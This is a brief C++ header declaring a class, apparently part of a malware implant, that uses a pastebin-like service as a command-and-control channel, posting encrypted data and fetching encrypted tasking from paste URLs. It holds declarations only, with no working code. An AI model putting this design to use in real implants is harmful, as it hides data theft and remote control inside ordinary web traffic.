#ifndef PASTEBIN_H
#define PASTEBIN_H

#include "comm.h"
#include "crypto.h"
#include <string>

class pastebin_c2 {
public:
    pastebin_c2(Comm* comm_module, crypto_encoder* encoder);
    
    // Posts encrypted data to a pastebin-like service
    // Returns the raw response (which might be a confirmation or link)
    std::string post_data(const std::string& data);

    // Fetches data from a URL (e.g., a raw paste link) and decrypts it
    std::string fetch_data(const std::wstring& url);

    // Syncs time from the server headers
    void sync_time();

private:
    Comm* comm_module;
    crypto_encoder* encoder;
    uint64_t last_synced_time;
};

#endif // PASTEBIN_H
